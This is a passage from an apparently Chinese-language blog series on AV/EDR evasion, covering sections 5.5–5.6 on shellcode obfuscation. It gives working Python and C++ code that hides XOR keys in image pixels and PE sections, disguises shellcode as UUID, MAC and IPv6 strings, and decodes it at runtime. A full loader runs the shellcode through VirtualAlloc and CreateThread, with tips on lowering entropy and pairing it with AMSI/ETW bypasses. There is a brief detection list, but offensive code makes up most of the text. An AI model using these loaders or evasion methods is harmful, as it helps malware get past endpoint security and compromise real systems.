class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>    r, g, b = pixels[i, <span class="hljs-number">0</span>]<br>    r = (r &amp; <span class="hljs-number">0xFE</span>) | ((key[i] &gt;&gt; <span class="hljs-number">0</span>) &amp; <span class="hljs-number">1</span>)<br>    g = (g &amp; <span class="hljs-number">0xFE</span>) | ((key[i] &gt;&gt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">1</span>)<br>    b = (b &amp; <span class="hljs-number">0xFE</span>) | ((key[i] &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">1</span>)<br>    pixels[i, <span class="hljs-number">0</span>] = (r, g, b)<br><br>img.save(<span class="hljs-string">&quot;key_hidden.png&quot;</span>)<br></code></pre></td></tr></table></figure>

<h5 id="C-示例：从图像中提取XOR密钥（使用LodePNG）："><a href="#C-示例：从图像中提取XOR密钥（使用LodePNG）：" class="headerlink" title="C++示例：从图像中提取XOR密钥（使用LodePNG）："></a>C++示例：从图像中提取XOR密钥（使用LodePNG）：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lodepng.h&quot;</span></span><br><br><span class="hljs-function">std::vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt; <span class="hljs-title">load_image_key</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* filename, <span class="hljs-type">int</span> key_len)</span> </span>&#123;<br>    std::vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt; image;<br>    <span class="hljs-type">unsigned</span> width, height;<br>    lodepng::<span class="hljs-built_in">decode</span>(image, width, height, filename);<br><br>    std::vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt; key;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; key_len; ++i) &#123;<br>        <span class="hljs-type">int</span> index = i * <span class="hljs-number">4</span>; <span class="hljs-comment">// RGBA</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> r = image[index];<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> g = image[index + <span class="hljs-number">1</span>];<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> b = image[index + <span class="hljs-number">2</span>];<br><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> k = ((r &amp; <span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-number">0</span>) | ((g &amp; <span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-number">1</span>) | ((b &amp; <span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-number">2</span>);<br>        key.<span class="hljs-built_in">push_back</span>(k);<br>    &#125;<br>    <span class="hljs-keyword">return</span> key;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="B-将密钥存储在PE节（隐蔽技术）"><a href="#B-将密钥存储在PE节（隐蔽技术）" class="headerlink" title="B. 将密钥存储在PE节（隐蔽技术）"></a><strong>B. 将密钥存储在PE节（隐蔽技术）</strong></h4><p>你可以添加一个自定义节（如<code>.key</code>）</p>
<p>到二进制中，并动态提取它。</p>
<h5 id="汇编链接脚本："><a href="#汇编链接脚本：" class="headerlink" title="汇编链接脚本："></a>汇编链接脚本：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">.section .key, &quot;rw&quot;<br>    .byte 0x55, 0x56, 0x57, 0x58<br></code></pre></td></tr></table></figure>

<h5 id="C-提取："><a href="#C-提取：" class="headerlink" title="C++提取："></a>C++提取：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> __start_key[];<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> __stop_key[];<br><br><span class="hljs-function">std::vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt; <span class="hljs-title">extract_key_from_section</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt;(__start_key, __stop_key);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>通过<code>ld</code>或类似工具链接并定义节的边界。</p>
<hr>
<h3 id="结合所有技术"><a href="#结合所有技术" class="headerlink" title="结合所有技术"></a><strong>结合所有技术</strong></h3><p>为了完全避开内存扫描器，你可以：</p>
<ol>
<li><p>将XOR密钥嵌入图像或PE节中。</p>
</li>
<li><p>通过填充或渐进解密降低熵。</p>
</li>
<li><p>使用多态解码器。</p>
</li>
</ol>
<hr>
<h3 id="最终考虑"><a href="#最终考虑" class="headerlink" title="最终考虑"></a><strong>最终考虑</strong></h3><ul>
<li><p>这些技术增强了OPSEC并提高了AV&#x2F;EDR规避能力。</p>
</li>
<li><p>它们无法100%保证规避成功 — 必须与行为规避（例如，系统调用伪造、卸载钩子）结合使用。</p>
</li>
<li><p>可以结合AMSI和ETW绕过技术，以实现完全的保护。</p>
</li>
</ul>
<h2 id="AV-EDR规避实用技术-5-5-使用UUID、MAC地址和IPv6格式混淆Shellcode"><a href="#AV-EDR规避实用技术-5-5-使用UUID、MAC地址和IPv6格式混淆Shellcode" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 5.5 使用UUID、MAC地址和IPv6格式混淆Shellcode"></a>AV&#x2F;EDR规避实用技术 - 5.5 使用UUID、MAC地址和IPv6格式混淆Shellcode</h2><p>这些是先进的规避技术，通过将Shellcode编码为看起来“正常”或“无害”的格式，来避开静态和行为扫描器。</p>
<h3 id="概述-6"><a href="#概述-6" class="headerlink" title="概述"></a><strong>概述</strong></h3><p>攻击者不是直接交付原始的Shellcode或Base64负载，而是使用以下格式进行编码，这些格式通常被视为无害：</p>
<ul>
<li><p><strong>UUIDs</strong>（例如，<code>2d464d45-91c7-4d12-8871-04d61817b3e3</code>）</p>
</li>
<li><p><strong>MAC地址</strong>（例如，<code>00:0C:29:6B:8E:1C</code>）</p>
</li>
<li><p><strong>IPv6地址</strong>（例如，<code>2001:0db8:85a3:0000:0000:8a2e:0370:7334</code>）</p>
</li>
</ul>
<p>这些模式绕过了常见的YARA规则和启发式扫描器，这些扫描器通常期望标准的hex&#x2F;Base64或PE格式。</p>
<hr>
<h3 id="技术A：将Shellcode作为UUIDs"><a href="#技术A：将Shellcode作为UUIDs" class="headerlink" title="技术A：将Shellcode作为UUIDs"></a><strong>技术A：将Shellcode作为UUIDs</strong></h3><h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>一个UUID（128位）可以编码<strong>16字节</strong>的Shellcode。我们将Shellcode分割成16字节的块，然后将每块转换为UUID字符串。</p>
<h3 id="Python（将Shellcode编码为UUID）"><a href="#Python（将Shellcode编码为UUID）" class="headerlink" title="Python（将Shellcode编码为UUID）"></a>Python（将Shellcode编码为UUID）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> uuid<br><br>shellcode = <span class="hljs-string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51&quot;</span><br>uuids = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(shellcode), <span class="hljs-number">16</span>):<br>    chunk = shellcode[i:i+<span class="hljs-number">16</span>]<br>    u = uuid.UUID(<span class="hljs-built_in">bytes</span>=chunk)<br>    uuids.append(<span class="hljs-built_in">str</span>(u))<br><br><span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> uuids:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;&quot;<span class="hljs-subst">&#123;u&#125;</span>&quot;,&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h3 id="C-（运行时解码UUIDs）"><a href="#C-（运行时解码UUIDs）" class="headerlink" title="C++（运行时解码UUIDs）"></a>C++（运行时解码UUIDs）</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;rpc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;Rpcrt4.lib&quot;</span>)</span><br><br><span class="hljs-type">char</span>* uuid_strs[] = &#123;<br>    <span class="hljs-string">&quot;fce48348-e8f0-00c0-5141-5041-5152&quot;</span>, <span class="hljs-comment">// 仅为示例</span><br>    <span class="hljs-comment">// 更多UUIDs</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decode_uuids</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* buffer)</span> </span>&#123;<br>    <span class="hljs-type">int</span> offset = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">sizeof</span>(uuid_strs) / <span class="hljs-built_in">sizeof</span>(uuid_strs[<span class="hljs-number">0</span>]); i++) &#123;<br>        UUID uuid;<br>        <span class="hljs-built_in">UuidFromStringA</span>((RPC_CSTR)uuid_strs[i], &amp;uuid);<br>        <span class="hljs-built_in">memcpy</span>(buffer + offset, &amp;uuid, <span class="hljs-number">16</span>);<br>        offset += <span class="hljs-number">16</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="技术B：通过MAC地址仿真Shellcode"><a href="#技术B：通过MAC地址仿真Shellcode" class="headerlink" title="技术B：通过MAC地址仿真Shellcode"></a><strong>技术B：通过MAC地址仿真Shellcode</strong></h3><h3 id="解释-1"><a href="#解释-1" class="headerlink" title="解释"></a>解释</h3><p>MAC地址编码了6字节。因此，一串类似MAC地址的字符串可以隐藏部分Shellcode。</p>
<h3 id="示例（编码后）"><a href="#示例（编码后）" class="headerlink" title="示例（编码后）"></a>示例（编码后）</h3><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-string">&quot;fc:48:83:e4:f0:e8&quot;</span>,<br><span class="hljs-string">&quot;c0:00:00:00:41:51&quot;</span>,<br>...<br></code></pre></td></tr></table></figure>

<h3 id="C-（解码器示例）"><a href="#C-（解码器示例）" class="headerlink" title="C++（解码器示例）"></a>C++（解码器示例）</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_mac</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* mac, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* out)</span> </span>&#123;<br>    <span class="hljs-built_in">sscanf</span>(mac, <span class="hljs-string">&quot;%hhx:%hhx:%hhx:%hhx:%hhx:%hhx&quot;</span>,<br>        &amp;out[<span class="hljs-number">0</span>], &amp;out[<span class="hljs-number">1</span>], &amp;out[<span class="hljs-number">2</span>], &amp;out[<span class="hljs-number">3</span>], &amp;out[<span class="hljs-number">4</span>], &amp;out[<span class="hljs-number">5</span>]);<br>&#125;<br><br><span class="hljs-type">char</span>* encoded[] = &#123;<br>    <span class="hljs-string">&quot;fc:48:83:e4:f0:e8&quot;</span>,<br>    <span class="hljs-string">&quot;c0:00:00:00:41:51&quot;</span>,<br>    <span class="hljs-comment">// 更多MAC地址</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decode_shellcode</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* buffer)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, offset = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">sizeof</span>(encoded)/<span class="hljs-built_in">sizeof</span>(encoded[<span class="hljs-number">0</span>]); i++, offset += <span class="hljs-number">6</span>) &#123;<br>        <span class="hljs-built_in">parse_mac</span>(encoded[i], buffer + offset);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="技术C：IPv6编码Shellcode"><a href="#技术C：IPv6编码Shellcode" class="headerlink" title="技术C：IPv6编码Shellcode"></a><strong>技术C：IPv6编码Shellcode</strong></h3><h3 id="解释-2"><a href="#解释-2" class="headerlink" title="解释"></a>解释</h3><p>IPv6地址是128位，与UUID相同。这种格式很少被检查，适用于DNS、内存或文件规避。</p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;fc48:83e4:f0e8:c000:0000:4151:4150:5251&quot;</span><br></code></pre></td></tr></table></figure>

<h3 id="C-解码器"><a href="#C-解码器" class="headerlink" title="C++解码器"></a>C++解码器</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_ipv6</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* ipv6_str, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* output)</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> parts[<span class="hljs-number">8</span>];<br>    <span class="hljs-built_in">sscanf</span>(ipv6_str, <span class="hljs-string">&quot;%hx:%hx:%hx:%hx:%hx:%hx:%hx:%hx&quot;</span>,<br>        &amp;parts[<span class="hljs-number">0</span>], &amp;parts[<span class="hljs-number">1</span>], &amp;parts[<span class="hljs-number">2</span>], &amp;parts[<span class="hljs-number">3</span>],<br>        &amp;parts[<span class="hljs-number">4</span>], &amp;parts[<span class="hljs-number">5</span>], &amp;parts[<span class="hljs-number">6</span>], &amp;parts[<span class="hljs-number">7</span>]);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        output[i * <span class="hljs-number">2</span>]     = (parts[i] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>;<br>        output[i * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] = parts[i] &amp; <span class="hljs-number">0xFF</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="结合执行"><a href="#结合执行" class="headerlink" title="结合执行"></a><strong>结合执行</strong></h3><p>解码Shellcode后，可以使用<code>VirtualAlloc + CreateThread</code>，<code>NtCreateThreadEx</code>或直接系统调用执行：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">execute_shellcode</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* shellcode, <span class="hljs-type">size_t</span> size)</span> </span>&#123;<br>    <span class="hljs-type">void</span>* exec = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-number">0</span>, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(exec, shellcode, size);<br>    ((<span class="hljs-built_in">void</span>(*)())exec)();<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="灵感来自HellShell"><a href="#灵感来自HellShell" class="headerlink" title="灵感来自HellShell"></a><strong>灵感来自HellShell</strong></h3><p><a target="_blank" rel="noopener" href="https://github.com/NUL0x4C/HellShell">HellShell</a>自动化了这种混淆，使用了：</p>
<ul>
<li><p>UUIDs</p>
</li>
<li><p>IPv6字符串</p>
</li>
<li><p>自定义加载器</p>
</li>
</ul>
<p>这些技术允许攻击者将负载交付为“无害”的字符串，避开熵或签名检查。</p>
<hr>
<h3 id="运行时考虑"><a href="#运行时考虑" class="headerlink" title="运行时考虑"></a><strong>运行时考虑</strong></h3><ul>
<li><p>避免字符串格式异常（格式错误的UUID可能触发AV）</p>
</li>
<li><p>如果直接嵌入字符串，使用进一步的混淆（如ROT13、Base64等）</p>
</li>
<li><p>使用间接执行方法（如回调或<code>CreateThread</code>）增加隐蔽性</p>
</li>
</ul>
<h3 id="真实世界示例"><a href="#真实世界示例" class="headerlink" title="真实世界示例"></a><strong>真实世界示例</strong></h3><ul>
<li><p><strong>Cobalt Strike</strong> 和 <strong>Metasploit</strong> 可以交付使用UUIDs混淆的负载。</p>
</li>
<li><p>恶意软件如 <strong>DarkHydrus</strong> 使用 <strong>IPv6 和 MAC格式</strong> 在DNS TXT记录中进行规避。</p>
</li>
</ul>
<hr>
<h3 id="检测与对策"><a href="#检测与对策" class="headerlink" title="检测与对策"></a><strong>检测与对策</strong></h3><p>安全团队应当：</p>
<ul>
<li><p>即使是编码格式也要应用<strong>熵分析</strong>。</p>
</li>
<li><p>在日志记录之前对不常见的数据格式（UUID、IPv6）进行归一化。</p>
</li>
<li><p>使用YARA规则，在<strong>解码后</strong>针对内存模式进行检测。</p>
</li>
</ul>
<h2 id="AV-EDR规避实用技术-5-6-使用混合编码和运行时解密的高级Shellcode混淆"><a href="#AV-EDR规避实用技术-5-6-使用混合编码和运行时解密的高级Shellcode混淆" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 5.6 使用混合编码和运行时解密的高级Shellcode混淆"></a>AV&#x2F;EDR规避实用技术 - 5.6 使用混合编码和运行时解密的高级Shellcode混淆</h2><h3 id="概述-7"><a href="#概述-7" class="headerlink" title="概述"></a><strong>概述</strong></h3><p>本节介绍了一些高级策略，用于通过以下方法绕过内存扫描器和基于签名的检测机制：</p>
<ul>
<li><p>使用<strong>混合混淆格式</strong>（UUID、IPv6、Base64、XOR、AES）。</p>
</li>
<li><p>将负载嵌入<strong>无害看起来的结构</strong>中。</p>
</li>
<li><p>采用<strong>运行时解密</strong>和<strong>降低熵的技术</strong>来减少可检测性。</p>
</li>
<li><p>使用<strong>节存储</strong>（例如，隐藏在<code>.rsrc</code>、<code>.data</code>或自定义PE节中）。</p>
</li>
<li><p>在<strong>执行时</strong>才实现解混淆逻辑。</p>
</li>
</ul>
<hr>
<h3 id="1-为什么高级混淆有效"><a href="#1-为什么高级混淆有效" class="headerlink" title="1. 为什么高级混淆有效"></a><strong>1. 为什么高级混淆有效</strong></h3><p>EDR和AV通常使用以下技术：</p>
<ul>
<li><p><strong>静态扫描</strong>（签名、熵分析）</p>
</li>
<li><p><strong>内存分析</strong>（扫描<code>RWX</code>区域，检测常见模式如<code>MZ</code>、<code>PE</code>或Shellcode的NOP雪崩）</p>
</li>
<li><p><strong>基于内存熵的启发式评分</strong></p>
</li>
</ul>
<p>通过将Shellcode分成伪装的片段并动态重建它们：</p>
<ul>
<li><p>避免静态检测。</p>
</li>
<li><p>降低内存中的熵。</p>
</li>
<li><p>增加逆向工程的复杂性。</p>
</li>
</ul>
<hr>
<h3 id="2-实际策略示例：混合混淆"><a href="#2-实际策略示例：混合混淆" class="headerlink" title="2. 实际策略示例：混合混淆"></a><strong>2. 实际策略示例：混合混淆</strong></h3><p>我们使用以下设置：</p>
<ul>
<li><p>Shellcode被分成若干块。</p>
</li>
<li><p>每一块都经过<strong>XOR加密</strong>并以<strong>UUID格式</strong>存储。</p>
</li>
<li><p>所有UUID被存储在一个隐藏的节（如<code>.sdata</code>）中，或嵌入到图像元数据（如通过隐写术嵌入在<code>.jpg</code>中）。</p>
</li>
<li><p>在运行时，解析UUID，解密并将其复制到<code>RWX</code>内存中以供执行。</p>
</li>
</ul>
<hr>
<h3 id="3-C-代码示例：混合加载器"><a href="#3-C-代码示例：混合加载器" class="headerlink" title="3. C++代码示例：混合加载器"></a><strong>3. C++代码示例：混合加载器</strong></h3><p>以下示例：</p>
<ul>
<li><p>将Shellcode以UUID格式嵌入。</p>
</li>
<li><p>使用XOR解密它。</p>
</li>
<li><p>使用<code>CreateThread</code>执行。</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;rpc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;Rpcrt4.lib&quot;</span>)</span><br><br><span class="hljs-comment">// XOR密钥</span><br><span class="hljs-type">const</span> BYTE XOR_KEY = <span class="hljs-number">0x5A</span>;<br><br><span class="hljs-comment">// UUID混淆的Shellcode（已经用XOR加密）</span><br>std::vector&lt;std::string&gt; uuid_shellcode = &#123;<br>    <span class="hljs-string">&quot;e48348fc-e8f0-00c0-0000-415141505251&quot;</span>,<br>    <span class="hljs-string">&quot;d2314856-4865-528b-6048-8b5218488b52&quot;</span><br>    <span class="hljs-comment">// 根据需要添加更多</span><br>&#125;;<br><br><span class="hljs-function">std::vector&lt;BYTE&gt; <span class="hljs-title">parse_and_decrypt_uuids</span><span class="hljs-params">(<span class="hljs-type">const</span> std::vector&lt;std::string&gt;&amp; uuids)</span> </span>&#123;<br>    std::vector&lt;BYTE&gt; decrypted;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; str : uuids) &#123;<br>        UUID uuid;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UuidFromStringA</span>((RPC_CSTR)str.<span class="hljs-built_in">c_str</span>(), &amp;uuid) != RPC_S_OK) &#123;<br>            std::cerr &lt;&lt; <span class="hljs-string">&quot;解析UUID失败: &quot;</span> &lt;&lt; str &lt;&lt; std::endl;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        BYTE* bytes = (BYTE*)&amp;uuid;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">sizeof</span>(UUID); i++) &#123;<br>            decrypted.<span class="hljs-built_in">push_back</span>(bytes[i] ^ XOR_KEY);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> decrypted;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    std::vector&lt;BYTE&gt; shellcode = <span class="hljs-built_in">parse_and_decrypt_uuids</span>(uuid_shellcode);<br><br>    LPVOID exec = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">nullptr</span>, shellcode.<span class="hljs-built_in">size</span>(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(exec, shellcode.<span class="hljs-built_in">data</span>(), shellcode.<span class="hljs-built_in">size</span>());<br><br>    <span class="hljs-comment">// 使用CreateThread代替直接函数指针，提高隐蔽性</span><br>    HANDLE hThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)exec, <span class="hljs-literal">nullptr</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">nullptr</span>);<br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="4-在自定义PE节中嵌入Shellcode"><a href="#4-在自定义PE节中嵌入Shellcode" class="headerlink" title="4. 在自定义PE节中嵌入Shellcode"></a><strong>4. 在自定义PE节中嵌入Shellcode</strong></h3><p>您可以使用像<a target="_blank" rel="noopener" href="https://github.com/hasherezade/pe-bear">PE-bear</a>这样的工具，向PE文件中添加一个<code>.xdata</code>或<code>.mysec</code>节，并手动将编码的Shellcode嵌入其中。在运行时：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HINSTANCE hModule = <span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-literal">NULL</span>);<br>BYTE* pShellcode = (BYTE*)<span class="hljs-built_in">FindResource</span>(hModule, <span class="hljs-built_in">MAKEINTRESOURCE</span>(IDR_MY_SHELLCODE), <span class="hljs-string">&quot;CUSTOM&quot;</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; shellcodeSize; ++i) &#123;<br>    pShellcode[i] ^= XOR_KEY; <span class="hljs-comment">// 就地解密</span><br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="5-降低熵示例"><a href="#5-降低熵示例" class="headerlink" title="5. 降低熵示例"></a><strong>5. 降低熵示例</strong></h3><p>与其将解密后的Shellcode直接加载到<code>RWX</code>内存中，不如：</p>
<ul>
<li><p>将其阶段性地加载到一个<code>RW</code>区域。</p>
</li>
<li><p>用<strong>诱饵指令</strong>、<strong>NOPs</strong>或<strong>合法调用前置代码</strong>填充，以减少熵。</p>
</li>
<li><p>只在最后时刻使用<code>VirtualProtect</code>将区域标记为<code>RX</code>。</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">DWORD oldProtect;<br><span class="hljs-built_in">VirtualProtect</span>(exec, shellcode.<span class="hljs-built_in">size</span>(), PAGE_EXECUTE_READ, &amp;oldProtect);<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="6-图像中的隐写嵌入"><a href="#6-图像中的隐写嵌入" class="headerlink" title="6. 图像中的隐写嵌入"></a><strong>6. 图像中的隐写嵌入</strong></h3><p>您可以：</p>
<ul>
